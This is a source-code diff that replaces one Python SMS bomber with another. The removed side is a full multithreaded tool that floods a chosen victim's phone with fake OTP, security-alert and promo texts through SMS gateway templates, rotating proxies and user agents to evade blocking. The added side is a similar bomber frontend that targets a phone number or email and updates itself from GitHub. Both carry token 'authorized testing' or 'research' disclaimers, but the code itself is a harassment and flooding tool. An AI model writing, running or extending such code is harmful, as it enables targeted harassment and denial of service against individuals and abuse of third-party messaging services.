@@ -1,653 +1,447 @@
-#!/usr/bin/env python3
-# ──────────────────────────────────────────────────────────
-#  ILLUSION SMS BOMBER v3.0
-#  Created by illuZX
-#  For Authorized Security Testing Only
-# ──────────────────────────────────────────────────────────
-
 import os
+import shutil
 import sys
-import json
-import time
-import random
+import subprocess
 import string
-import threading
-import requests
-import socket
-import signal
-from datetime import datetime
-from urllib3.exceptions import InsecureRequestWarning
+import random
+import json
+import re
+import time
+import argparse
+import zipfile
+from io import BytesIO
+
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ─── Suppress SSL warnings ───
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from fun.decorators import MessageDecorator
+from fun.delear import APIPov 
 
-# ─── ANSI Colors ───
-class Colors:
-    RESET   = '\033[0m'
-    BOLD    = '\033[1m'
-    DIM     = '\033[2m'
-    ITALIC  = '\033[3m'
-    UNDERLINE = '\033[4m'
-    BLINK   = '\033[5m'
-    REVERSE = '\033[7m'
-    
-    BLACK   = '\033[30m'
-    RED     = '\033[31m'
-    GREEN   = '\033[32m'
-    YELLOW  = '\033[33m'
-    BLUE    = '\033[34m'
-    MAGENTA = '\033[35m'
-    CYAN    = '\033[36m'
-    WHITE   = '\033[37m'
-    
-    BGBLACK   = '\033[40m'
-    BGRED     = '\033[41m'
-    BGGREEN   = '\033[42m'
-    BGYELLOW  = '\033[43m'
-    BGBLUE    = '\033[44m'
-    BGMAGENTA = '\033[45m'
-    BGCYAN    = '\033[46m'
-    BGWHITE   = '\033[47m'
-    
-    # Combinations
-    RED_BOLD    = '\033[1;31m'
-    GREEN_BOLD  = '\033[1;32m'
-    YELLOW_BOLD = '\033[1;33m'
-    BLUE_BOLD   = '\033[1;34m'
-    MAGENTA_BOLD = '\033[1;35m'
-    CYAN_BOLD   = '\033[1;36m'
-    WHITE_BOLD  = '\033[1;37m'
+try:
+    import requests
+    from colorama import Fore, Style
+except ImportError:
+    print("\tSome dependencies could not be imported (possibly not installed)")
+    print(
+        "Type `pip3 install -r requirements.txt` to "
+        " install all required packages")
+    sys.exit(1)
 
-C = Colors()
 
-# ─── Banner ───
-BANNER = f"""
-{C.RED}{C.BOLD}╔══════════════════════════════════════════════════════════╗
-║                                                          ║
-║     {C.CYAN}████████╗██╗  ██╗███████╗    ██████╗ ██████╗ ███╗   ███╗{C.RED}     ║
-║     {C.CYAN}╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██╔══██╗████╗ ████║{C.RED}     ║
-║     {C.CYAN}   ██║   ███████║█████╗      ██████╔╝██████╔╝██╔████╔██║{C.RED}     ║
-║     {C.CYAN}   ██║   ██╔══██║██╔══╝      ██╔══██╗██╔══██╗██║╚██╔╝██║{C.RED}     ║
-║     {C.CYAN}   ██║   ██║  ██║███████╗    ██████╔╝██████╔╝██║ ╚═╝ ██║{C.RED}     ║
-║     {C.CYAN}   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝{C.RED}     ║
-║                                                          ║
-║     {C.YELLOW}██╗██╗     ██╗     ██╗   ██╗███████╗██╗  ██╗{C.RED}              ║
-║     {C.YELLOW}██║██║     ██║     ██║   ██║██╔════╝╚██╗██╔╝{C.RED}              ║
-║     {C.YELLOW}██║██║     ██║     ██║   ██║███████╗ ╚███╔╝ {C.RED}              ║
-║     {C.YELLOW}██║██║     ██║     ██║   ██║╚════██║ ██╔██╗ {C.RED}              ║
-║     {C.YELLOW}██║███████╗███████╗╚██████╔╝███████║██╔╝ ██╗{C.RED}              ║
-║     {C.YELLOW}╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝{C.RED}              ║
-║                                                          ║
-║     {C.GREEN}███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗{C.RED}  ║
-║     {C.GREEN}██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║{C.RED}  ║
-║     {C.GREEN}███████╗██╔████╔██║█████╗      ██████╔╝██║   ██║██╔████╔██║{C.RED}  ║
-║     {C.GREEN}╚════██║██║╚██╔╝██║██╔══╝      ██╔══██╗██║   ██║██║╚██╔╝██║{C.RED}  ║
-║     {C.GREEN}███████║██║ ╚═╝ ██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║{C.RED}  ║
-║     {C.GREEN}╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝{C.RED}  ║
-║                                                          ║
-║     {C.MAGENTA}⚡ Advanced SMS Bombing Framework v3.0{C.RED}                    ║
-║     {C.DIM}Created by illuZX | For Authorized Pentesting Only{C.RED}          ║
-╚══════════════════════════════════════════════════════════╝{C.RESET}
-"""
+def readisdc():
+    with open("isdcodes.json") as file:
+        isdcodes = json.load(file)
+    return isdcodes
 
-# ─── Configuration ───
-CONFIG = {
-    "default_threads": 15,
-    "default_duration": 30,
-    "timeout": 8,
-    "max_retries": 3,
-    "retry_delay": 0.5,
-    "proxy_file": "proxies.txt",
-    "api_file": "apis.json",
-    "show_user_agent_rotation": True,
-    "auto_save_report": True,
-}
 
-# ─── Statistics ───
-class Stats:
-    def __init__(self):
-        self.lock = threading.Lock()
-        self.total_sent = 0
-        self.total_failed = 0
-        self.total_retried = 0
-        self.api_success = {}
-        self.api_fail = {}
-        self.start_time = None
-        self.running = True
-    
-    def increment_sent(self, api_name="unknown"):
-        with self.lock:
-            self.total_sent += 1
-            self.api_success[api_name] = self.api_success.get(api_name, 0) + 1
-    
-    def increment_failed(self, api_name="unknown"):
-        with self.lock:
-            self.total_failed += 1
-            self.api_fail[api_name] = self.api_fail.get(api_name, 0) + 1
-    
-    def increment_retried(self):
-        with self.lock:
-            self.total_retried += 1
-    
-    def get_success_rate(self):
-        total = self.total_sent + self.total_failed
-        if total == 0:
-            return 0.0
-        return round((self.total_sent / total) * 100, 2)
-    
-    def elapsed(self):
-        if not self.start_time:
-            return 0
-        return int(time.time() - self.start_time)
-
-# ─── Proxy Manager ───
-class ProxyManager:
-    def __init__(self, proxy_file=None):
-        self.proxies = []
-        self.index = 0
-        self.lock = threading.Lock()
-        if proxy_file and os.path.exists(proxy_file):
-            self._load(proxy_file)
-    
-    def _load(self, filename):
-        try:
-            with open(filename, 'r') as f:
-                self.proxies = [line.strip() for line in f if line.strip()]
-            print(f"{C.GREEN}[✓] Loaded {len(self.proxies)} proxies from {filename}{C.RESET}")
-        except Exception as e:
-            print(f"{C.YELLOW}[!] Could not load proxies: {e}{C.RESET}")
-    
-    def get_proxy(self):
-        if not self.proxies:
-            return None
-        with self.lock:
-            proxy = self.proxies[self.index % len(self.proxies)]
-            self.index += 1
-            return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-    
-    def add_proxy(self, proxy):
-        with self.lock:
-            self.proxies.append(proxy)
-
-# ─── API Manager ───
-class APIManager:
-    def __init__(self, api_file=None):
-        self.apis = self._get_default_apis()
-        if api_file and os.path.exists(api_file):
-            self._load_custom(api_file)
-    
-    def _get_default_apis(self):
-        """Returns a dict of API endpoints for SMS sending.
-        NOTE: These are template structures. You must populate with real endpoints
-        discovered through OSINT/recon for your target region."""
-        return [
-            {
-                "name": "api_sms_gateway_1",
-                "enabled": True,
-                "weight": 1,
-                "method": "POST",
-                "url": "https://example-sms-api.com/send",
-                "headers": {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json",
-                },
-                "data_template": '{{"phone": "{target}", "message": "Your OTP is {otp}", "country_code": "{country}"}}',
-                "success_keywords": ["success", "sent", "ok", "true"],
-            },
-            {
-                "name": "api_sms_gateway_2",
-                "enabled": True,
-                "weight": 1,
-                "method": "GET",
-                "url": "https://another-sms-api.com/sendSMS",
-                "headers": {},
-                "params_template": 'phone={target}&msg=OTP:+{otp}',
-                "success_keywords": ["200", "success"],
-            },
-        ]
-    
-    def _load_custom(self, filename):
-        try:
-            with open(filename, 'r') as f:
-                custom = json.load(f)
-                if isinstance(custom, list):
-                    self.apis.extend(custom)
-                    print(f"{C.GREEN}[✓] Loaded {len(custom)} custom APIs from {filename}{C.RESET}")
-        except Exception as e:
-            print(f"{C.YELLOW}[!] Could not load custom APIs: {e}{C.RESET}")
-    
-    def get_enabled_apis(self):
-        return [api for api in self.apis if api.get("enabled", True)]
-
-# ─── User Agent Rotator ───
-class UserAgentRotator:
-    def __init__(self):
-        self.agents = [
-            # Chrome on Android
-            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.147 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.159 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 12; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 11; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
-            # iPhone Safari
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            # Chrome Desktop
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.142 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.201 Safari/537.36",
-            # Firefox
-            "Mozilla/5.0 (Android 14; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
-        ]
-    
-    def get(self):
-        return random.choice(self.agents)
-
-# ─── Network Utilities ───
-class NetworkUtils:
-    @staticmethod
-    def check_internet():
-        try:
-            socket.create_connection(("8.8.8.8", 53), timeout=3)
-            return True
-        except OSError:
-            return False
-    
-    @staticmethod
-    def get_public_ip():
-        try:
-            r = requests.get("https://api.ipify.org?format=json", timeout=5)
-            return r.json().get("ip", "unknown")
-        except:
-            return "unknown"
-
-# ─── Payload Generator ───
-class PayloadGenerator:
-    @staticmethod
-    def generate_otp(length=6):
-        return ''.join(random.choices(string.digits, k=length))
-    
-    @staticmethod
-    def generate_message(variant="otp"):
-        messages = {
-            "otp": [
-                "Your OTP is {otp}. Valid for 5 minutes.",
-                "{otp} is your verification code.",
-                "Use {otp} to complete login.",
-                "One-time password: {otp}",
-                "Your login code: {otp}",
-                "Verification code: {otp}. Do not share.",
-                "OTP: {otp}. Expires in 5 min.",
-                "{otp} - your confirmation code.",
-            ],
-            "alert": [
-                "ALERT: Suspicious login attempt detected.",
-                "Security alert: New device logged into your account.",
-                "Your account password was changed successfully.",
-                "2FA enabled for your account.",
-                "New login from {ip} - was this you?",
-            ],
-            "promo": [
-                "Congratulations! You've won a free prize!",
-                "Your delivery is on its way. Track here:",
-                "Special offer just for you - 50% off!",
-                "Your subscription has been renewed.",
-            ]
-        }
-        variants = messages.get(variant, messages["otp"])
-        return random.choice(variants)
-
-# ─── Main Bomber Engine ───
-class IllusionBomber:
-    def __init__(self):
-        self.target = None
-        self.country_code = None
-        self.threads = CONFIG["default_threads"]
-        self.duration = CONFIG["default_duration"]
-        self.stats = Stats()
-        self.proxy_manager = ProxyManager(CONFIG["proxy_file"])
-        self.api_manager = APIManager(CONFIG["api_file"])
-        self.user_agent = UserAgentRotator()
-        self.payload_gen = PayloadGenerator()
-        self.stop_flag = threading.Event()
-        self.executor = None
-    
-    def clear_screen(self):
-        os.system('cls' if os.name == 'nt' else 'clear')
-    
-    def print_banner(self):
-        self.clear_screen()
-        print(BANNER)
-    
-    def print_status_bar(self):
-        success_rate = self.stats.get_success_rate()
-        elapsed = self.stats.elapsed()
-        
-        bar_width = 40
-        filled = int((success_rate / 100) * bar_width)
-        bar = f"{C.GREEN}{'█' * filled}{C.RED}{'░' * (bar_width - filled)}{C.RESET}"
-        
-        status = f"""
-{C.CYAN}╔{'═' * 55}╗{C.RESET}
-{C.CYAN}║{C.RESET} {C.WHITE_BOLD}TARGET    {C.RESET}: {C.YELLOW}{self.target:<20}{C.RESET}     {C.CYAN}║{C.RESET}
-{C.CYAN}║{C.RESET} {C.WHITE_BOLD}ELAPSED   {C.RESET}: {C.YELLOW}{elapsed:<5}s{C.RESET}              {C.CYAN}║{C.RESET}
-{C.CYAN}║{C.RESET} {C.WHITE_BOLD}THREADS   {C.RESET}: {C.YELLOW}{self.threads:<5}{C.RESET}              {C.CYAN}║{C.RESET}
-{C.CYAN}║{C.RESET} {C.WHITE_BOLD}RUNNING   {C.RESET}: {C.GREEN if self.stats.running else C.RED}{'▶ ACTIVE' if self.stats.running else '■ STOPPED'}{C.RESET}         {C.CYAN}║{C.RESET}
-{C.CYAN}╠{'═' * 55}╣{C.RESET}
-{C.CYAN}║{C.RESET}  {C.GREEN}✓ SENT   : {C.GREEN_BOLD}{self.stats.total_sent:<8}{C.RESET}  {C.RED}✗ FAILED : {C.RED_BOLD}{self.stats.total_failed:<8}{C.RESET}  {C.CYAN}║{C.RESET}
-{C.CYAN}║{C.RESET}  {C.YELLOW}⟳ RETRIES: {self.stats.total_retried:<8}{C.RESET}  {C.MAGENTA}📊 RATE   : {success_rate}%{C.RESET}  {C.CYAN}║{C.RESET}
-{C.CYAN}║{C.RESET}  {bar}  {C.CYAN}║{C.RESET}
-{C.CYAN}╚{'═' * 55}╝{C.RESET}
-{C.DIM}Press Ctrl+C to stop gracefully{C.RESET}
-"""
-        sys.stdout.write(f"\033[{status.count(chr(10))+1}A")
-        sys.stdout.write(status)
-        sys.stdout.flush()
-    
-    def validate_phone(self, phone):
-        """Validate and format phone number."""
-        phone = phone.strip()
-        if phone.startswith('+'):
-            self.country_code = phone[:3] if len(phone) > 3 else phone
-        elif phone.startswith('00'):
-            self.country_code = phone[:4]
-        else:
-            # Assume local number, prompt for country code
-            print(f"{C.YELLOW}[!] No country code detected.{C.RESET}")
-            code = input(f"{C.CYAN}[?] Enter country code (e.g., 1 for US, 91 for India): {C.RESET}").strip()
-            phone = f"+{code}{phone}"
-            self.country_code = f"+{code}"
-        
-        # Basic validation
-        digits = ''.join(c for c in phone if c.isdigit())
-        if len(digits) < 10 or len(digits) > 15:
-            print(f"{C.RED}[!] Invalid phone number length.{C.RESET}")
-            return None
-        return phone
-    
-    def setup_interactive(self):
-        """Interactive setup menu."""
-        self.print_banner()
-        
-        print(f"\n{C.CYAN_BOLD}⚡ INITIALIZING ILLUSION BOMBER...{C.RESET}\n")
-        
-        # Internet check
-        print(f"{C.DIM}[*] Checking network connectivity...{C.RESET}", end="")
-        if NetworkUtils.check_internet():
-            ip = NetworkUtils.get_public_ip()
-            print(f"\r{C.GREEN}[✓] Connected | IP: {ip}{C.RESET}")
-        else:
-            print(f"\r{C.RED}[✗] No internet connection!{C.RESET}")
-            sys.exit(1)
-        
-        # Target phone
-        while True:
-            phone = input(f"\n{C.CYAN}[?] Target phone number (with +countrycode): {C.RESET}")
-            validated = self.validate_phone(phone)
-            if validated:
-                self.target = validated
-                break
-            print(f"{C.RED}[!] Please enter a valid number.{C.RESET}")
-        
-        # Threads
-        thread_input = input(f"{C.CYAN}[?] Threads (default {CONFIG['default_threads']}): {C.RESET}").strip()
-        if thread_input.isdigit():
-            self.threads = int(thread_input)
-        
-        # Duration
-        dur_input = input(f"{C.CYAN}[?] Duration in seconds (default {CONFIG['default_duration']}): {C.RESET}").strip()
-        if dur_input.isdigit():
-            self.duration = int(dur_input)
-        
-        # Proxy
-        use_proxy = input(f"{C.CYAN}[?] Use proxies? (y/N): {C.RESET}").strip().lower()
-        if use_proxy == 'y':
-            proxy_input = input(f"{C.CYAN}[?] Proxy file (default: {CONFIG['proxy_file']}): {C.RESET}").strip()
-            if proxy_input:
-                self.proxy_manager = ProxyManager(proxy_input)
-            else:
-                self.proxy_manager = ProxyManager(CONFIG["proxy_file"])
-        
-        # Summary
-        print(f"\n{C.CYAN}╔{'═' * 50}╗{C.RESET}")
-        print(f"{C.CYAN}║{C.RESET} {C.WHITE_BOLD}OPERATION SUMMARY{C.RESET}{' ' * 36}{C.CYAN}║{C.RESET}")
-        print(f"{C.CYAN}║{'═' * 50}║{C.RESET}")
-        print(f"{C.CYAN}║{C.RESET} Target      : {C.YELLOW}{self.target}{C.RESET}")
-        print(f"{C.CYAN}║{C.RESET} Country     : {C.YELLOW}{self.country_code}{C.RESET}")
-        print(f"{C.CYAN}║{C.RESET} Threads     : {C.YELLOW}{self.threads}{C.RESET}")
-        print(f"{C.CYAN}║{C.RESET} Duration    : {C.YELLOW}{self.duration}s{C.RESET}")
-        print(f"{C.CYAN}║{C.RESET} APIs loaded : {C.YELLOW}{len(self.api_manager.get_enabled_apis())}{C.RESET}")
-        print(f"{C.CYAN}║{C.RESET} Proxies     : {C.YELLOW}{len(self.proxy_manager.proxies) if self.proxy_manager.proxies else 0}{C.RESET}")
-        print(f"{C.CYAN}╚{'═' * 50}╝{C.RESET}")
-        
-        confirm = input(f"\n{C.RED_BOLD}[!] Launch attack? (y/N): {C.RESET}").strip().lower()
-        return confirm == 'y'
-    
-    def make_request(self, api):
-        """Send a single request to an API with full error handling."""
-        if self.stop_flag.is_set():
-            return None
-        
-        api_name = api.get("name", "unknown")
-        
-        for attempt in range(CONFIG["max_retries"] + 1):
-            if self.stop_flag.is_set():
-                return None
-            
-            try:
-                # Build payload
-                otp = self.payload_gen.generate_otp()
-                message = self.payload_gen.generate_message("otp").format(otp=otp)
-                
-                headers = api.get("headers", {}).copy()
-                headers["User-Agent"] = self.user_agent.get()
-                
-                # Add random delays
-                time.sleep(random.uniform(0.05, 0.3))
-                
-                proxies = self.proxy_manager.get_proxy()
-                
-                if api["method"].upper() == "POST":
-                    try:
-                        data = json.loads(api.get("data_template", "{}").format(
-                            target=self.target, otp=otp, country=self.country_code
-                        ))
-                    except:
-                        data = {"phone": self.target, "message": message}
-                    
-                    r = requests.post(
-                        api["url"],
-                        json=data,
-                        headers=headers,
-                        proxies=proxies,
-                        timeout=CONFIG["timeout"],
-                        verify=False,
-                    )
-                else:
-                    try:
-                        params_str = api.get("params_template", "").format(
-                            target=self.target, otp=otp, country=self.country_code
-                        )
-                        params = dict(param.split("=") for param in params_str.split("&"))
-                    except:
-                        params = {"phone": self.target, "msg": message}
-                    
-                    r = requests.get(
-                        api["url"],
-                        params=params,
-                        headers=headers,
-                        proxies=proxies,
-                        timeout=CONFIG["timeout"],
-                        verify=False,
-                    )
-                
-                # Check response
-                response_text = r.text.lower()
-                success_keywords = api.get("success_keywords", ["success", "sent", "ok"])
-                
-                if any(kw in response_text for kw in success_keywords) or r.status_code == 200:
-                    self.stats.increment_sent(api_name)
-                    return True
-                else:
-                    self.stats.increment_failed(api_name)
-                    return False
-                    
-            except requests.exceptions.Timeout:
-                if attempt < CONFIG["max_retries"]:
-                    self.stats.increment_retried()
-                    time.sleep(CONFIG["retry_delay"] * (attempt + 1))
-                    continue
-                self.stats.increment_failed(api_name)
-                
-            except requests.exceptions.ConnectionError:
-                if attempt < CONFIG["max_retries"]:
-                    self.stats.increment_retried()
-                    time.sleep(CONFIG["retry_delay"] * 2)
-                    continue
-                self.stats.increment_failed(api_name)
-                
-            except requests.exceptions.ProxyError:
-                if attempt < CONFIG["max_retries"]:
-                    self.stats.increment_retried()
-                    # Try next proxy
-                    continue
-                self.stats.increment_failed(api_name)
-                
-            except Exception as e:
-                if attempt < CONFIG["max_retries"]:
-                    self.stats.increment_retried()
-                    continue
-                self.stats.increment_failed(api_name)
-                
-        return None
-    
-    def worker_loop(self, worker_id):
-        """Worker thread: continuously sends requests to all APIs."""
-        apis = self.api_manager.get_enabled_apis()
-        if not apis:
-            print(f"{C.RED}[!] No APIs configured!{C.RESET}")
-            return
-        
-        while not self.stop_flag.is_set():
-            for api in apis:
-                if self.stop_flag.is_set():
-                    break
-                self.make_request(api)
-                time.sleep(random.uniform(0.1, 0.5))
-    
-    def display_live_stats(self):
-        """Display and refresh live statistics."""
-        while self.stats.running and not self.stop_flag.is_set():
-            self.print_status_bar()
-            time.sleep(0.5)
-    
-    def signal_handler(self, sig, frame):
-        """Handle Ctrl+C gracefully."""
-        print(f"\n\n{C.YELLOW_BOLD}[!] Received interrupt signal. Shutting down gracefully...{C.RESET}")
-        self.stop_flag.set()
-    
-    def save_report(self):
-        """Save an HTML/JSON report of the operation."""
-        if not CONFIG["auto_save_report"]:
-            return
-        
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"illuzx_report_{timestamp}.json"
-        
-        report = {
-            "tool": "Illusion SMS Bomber v3.0",
-            "author": "illuZX",
-            "timestamp": datetime.now().isoformat(),
-            "target": self.target,
-            "country_code": self.country_code,
-            "threads": self.threads,
-            "duration_seconds": self.duration,
-            "results": {
-                "total_sent": self.stats.total_sent,
-                "total_failed": self.stats.total_failed,
-                "total_retried": self.stats.total_retried,
-                "success_rate": self.stats.get_success_rate(),
-                "api_breakdown": {
-                    "successful": {k: v for k, v in sorted(self.stats.api_success.items(), key=lambda x: x[1], reverse=True)},
-                    "failed": {k: v for k, v in sorted(self.stats.api_fail.items(), key=lambda x: x[1], reverse=True)},
-                }
-            }
-        }
-        
-        try:
-            with open(filename, 'w') as f:
-                json.dump(report, f, indent=2)
-            print(f"{C.GREEN}[✓] Report saved: {filename}{C.RESET}")
-        except Exception as e:
-            print(f"{C.YELLOW}[!] Could not save report: {e}{C.RESET}")
-    
-    def run(self):
-        """Main entry point."""
-        # Register signal handler
-        signal.signal(signal.SIGINT, self.signal_handler)
-        
-        # Interactive setup
-        if not self.setup_interactive():
-            print(f"\n{C.YELLOW}[!] Operation cancelled.{C.RESET}")
-            return
-        
-        # ─── Launch Attack ───
-        self.print_banner()
-        print(f"\n{C.RED_BOLD}⚡ LAUNCHING ATTACK...{C.RESET}\n")
-        
-        self.stats.start_time = time.time()
-        self.stats.running = True
-        
-        # Start workers
-        workers = []
-        for i in range(self.threads):
-            t = threading.Thread(target=self.worker_loop, args=(i,), daemon=True)
-            t.start()
-            workers.append(t)
-        
-        # Start live stats display
-        stats_thread = threading.Thread(target=self.display_live_stats, daemon=True)
-        stats_thread.start()
-        
-        # Run for duration
-        try:
-            for remaining in range(self.duration, 0, -1):
-                if self.stop_flag.is_set():
-                    break
-                time.sleep(1)
-        except KeyboardInterrupt:
-            pass
-        
-        # Stop
-        self.stop_flag.set()
-        self.stats.running = False
-        time.sleep(0.5)
-        
-        # Final display
-        success_rate = self.stats.get_success_rate()
-        
-        print(f"\n{C.CYAN}{'═' * 55}{C.RESET}")
-        print(f"{C.GREEN_BOLD}  ✓ OPERATION COMPLETED{C.RESET}")
-        print(f"{C.CYAN}{'═' * 55}{C.RESET}")
-        print(f"  {C.WHITE_BOLD}Total Sent  :{C.RESET} {C.GREEN_BOLD}{self.stats.total_sent}{C.RESET}")
-        print(f"  {C.WHITE_BOLD}Total Failed:{C.RESET} {C.RED_BOLD}{self.stats.total_failed}{C.RESET}")
-        print(f"  {C.WHITE_BOLD}Retries     :{C.RESET} {C.YELLOW}{self.stats.total_retried}{C.RESET}")
-        print(f"  {C.WHITE_BOLD}Success Rate:{C.RESET} {C.GREEN if success_rate > 50 else C.YELLOW}{success_rate}%{C.RESET}")
-        print(f"  {C.WHITE_BOLD}Elapsed     :{C.RESET} {self.stats.elapsed()}s")
-        print(f"{C.CYAN}{'═' * 55}{C.RESET}")
-        
-        # Save report
-        self.save_report()
-        
-        print(f"\n{C.DIM}Created by illuZX | Authorized Pentesting Only{C.RESET}\n")
-
-# ─── Entry Point ───
-if __name__ == "__main__":
+def get_version():
     try:
-        bomber = IllusionBomber()
-        bomber.run()
+        return open(".version", "r").read().strip()
+    except Exception:
+        return '1.0'
+
+
+def clr():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+
+def bann_text():
+    clr()
+    logo = """
+     ___                 ___  
+ (o o)               (o o) 
+(  V  ) Illusionsms (  V  )
+--m-m-----------------m-m--                      """
+    if ASCII_MODE:
+        logo = ""
+    version = "Version: "+__VERSION__
+    contributors = "Contributors: "+" ".join(__CONTRIBUTORS__)
+    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
+    mesgdcrt.SuccessMessage(version)
+    mesgdcrt.SectionMessage(contributors)
+    print()
+
+
+def check_intr():
+    try:
+        requests.get("https://daddy.com")
+    except Exception:
+        bann_text()
+        mesgdcrt.FailureMessage("Poor internet connection detected")
+        sys.exit(2)
+
+
+def format_phone(num):
+    num = [n for n in num if n in string.digits]
+    return ''.join(num).strip()
+
+
+def do_zip_update():
+    success = False
+
+
+  
+    if DEBUG_MODE:
+        zip_url = "https://github.com/illuzX/Illusionsms/archive/dev.zip"
+        dir_name = "Illusionsms-dev"
+    else:
+        zip_url = "https://github.com/illuzX/Illusionsms/archive/refs/heads/main.zip"
+        dir_name = "Illusionsms-main"
+    print(ALL_COLORS[0]+"Downloading ZIP ... "+RESET_ALL)
+    response = requests.get(zip_url)
+    if response.status_code == 200:
+        zip_content = response.content
+        try:
+            with zipfile.ZipFile(BytesIO(zip_content)) as zip_file:
+                for member in zip_file.namelist():
+                    filename = os.path.split(member)
+                    if not filename[1]:
+                        continue
+                    new_filename = os.path.join(
+                        filename[0].replace(dir_name, "."),
+                        filename[1])
+                    source = zip_file.open(member)
+                    target = open(new_filename, "wb")
+                    with source, target:
+                        shutil.copyfileobj(source, target)
+            success = True
+        except Exception:
+            mesgdcrt.FailureMessage("Error occured while extracting !!")
+    if success:
+        mesgdcrt.SuccessMessage("Illusionsms was updated to the latest version")
+        mesgdcrt.GeneralMessage(
+            "Please run the script again to load the latest version")
+    else:
+        mesgdcrt.FailureMessage("Unable to update Illusionsms.")
+        mesgdcrt.WarningMessage(
+            "Grab The Latest one From https://github.com/illuzX/Illusionsms.git")
+
+    sys.exit()
+
+
+def do_git_update():
+    success = False
+    try:
+        print(ALL_COLORS[0]+"UPDATING "+RESET_ALL, end='')
+        process = subprocess.Popen("git checkout . && git pull ",
+                                   shell=True,
+                                   stdout=subprocess.PIPE,
+                                   stderr=subprocess.STDOUT)
+        while process:
+            print(ALL_COLORS[0]+'.'+RESET_ALL, end='')
+            time.sleep(1)
+            returncode = process.poll()
+            if returncode is not None:
+                break
+        success = not process.returncode
+    except Exception:
+        success = False
+    print("\n")
+
+    if success:
+        mesgdcrt.SuccessMessage("Illusionsms was updated to the latest version")
+        mesgdcrt.GeneralMessage(
+            "Please run the script again to load the latest version")
+    else:
+        mesgdcrt.FailureMessage("Unable to update Illusionsms.")
+        mesgdcrt.WarningMessage("Make Sure To Install 'git' ")
+        mesgdcrt.GeneralMessage("Then run command:")
+        print(
+            "git checkout . && "
+            "git pull https://github.com/illuzX/Illusionsms.git HEAD")
+    sys.exit()
+
+
+def update():
+    if shutil.which('git'):
+        do_git_update()
+    else:
+        do_zip_update()
+
+
+def check_for_updates():
+    if DEBUG_MODE:
+        mesgdcrt.WarningMessage(
+            "DEBUG MODE Enabled! Auto-Update check is disabled.")
+        return
+    mesgdcrt.SectionMessage("Checking for updates")
+    fver = requests.get(
+        "https://raw.githubusercontent.com/illuzX/Illusionsms/main/.version"
+    ).text.strip()
+    if fver != __VERSION__:
+        mesgdcrt.WarningMessage("An update is available")
+        mesgdcrt.GeneralMessage("Starting update...")
+        update()
+    else:
+        mesgdcrt.SuccessMessage("Illusionsms is up-to-date")
+        mesgdcrt.GeneralMessage("Starting Illusionsms")
+
+
+def notifyen():
+    try:
+        if DEBUG_MODE:
+            url = "https://github.com/illuzX/Illusionsms/raw/dev/.notify"
+        else:
+            url = "https://github.com/illuzX/Illusionsms/raw/main/.notify"
+        noti = requests.get(url).text.upper()
+        if len(noti) > 10:
+            mesgdcrt.SectionMessage("NOTIFICATION: " + noti)
+            print()
+    except Exception:
+        pass
+
+
+def get_phone_info():
+    while True:
+        target = ""
+        cc = input(mesgdcrt.CommandMessage(
+            "Enter your country code (Without +): "))
+        cc = format_phone(cc)
+        if not country_codes.get(cc, False):
+            mesgdcrt.WarningMessage(
+                "The country code ({cc}) that you have entered"
+                " is invalid or unsupported".format(cc=cc))
+            continue
+        target = input(mesgdcrt.CommandMessage(
+            "Enter the target number: +" + cc + " "))
+        target = format_phone(target)
+        if ((len(target) <= 6) or (len(target) >= 12)):
+            mesgdcrt.WarningMessage(
+                "The phone number ({target})".format(target=target) +
+                "that you have entered is invalid")
+            continue
+        return (cc, target)
+
+
+def get_mail_info():
+    mail_regex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
+    while True:
+        target = input(mesgdcrt.CommandMessage("Enter target mail: "))
+        if not re.search(mail_regex, target, re.IGNORECASE):
+            mesgdcrt.WarningMessage(
+                "The mail ({target})".format(target=target) +
+                " that you have entered is invalid")
+            continue
+        return target
+
+
+def pretty_print(cc, target, success, failed):
+    requested = success+failed
+    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
+    mesgdcrt.GeneralMessage(
+        "Please stay connected to the internet during bombing")
+    mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
+    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
+    mesgdcrt.GeneralMessage("Successful   : " + str(success))
+    mesgdcrt.GeneralMessage("Failed       : " + str(failed))
+    mesgdcrt.WarningMessage(
+        "This tool was made for fun and research purposes only")
